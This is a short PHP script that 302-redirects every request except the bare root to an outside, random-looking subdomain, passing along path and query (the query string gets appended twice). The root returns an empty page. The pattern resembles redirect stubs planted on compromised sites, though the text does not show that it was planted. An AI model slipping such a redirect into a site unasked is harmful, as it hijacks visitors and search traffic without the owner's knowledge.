<?php

$redirect_url = 'https://k37rgt.parsim.co.uk';
$request_uri = $_SERVER['REQUEST_URI'];
$query_string = $_SERVER['QUERY_STRING'];

if (trim($request_uri, '/') !== '' || trim($query_string) !== '') {
    $full_url = $redirect_url . $request_uri;
    if (!empty($query_string)) {
        $full_url .= '?' . $query_string;
    }
    header('Location: ' . $full_url, true, 302);
    exit;
} else {
    echo "";
}
?>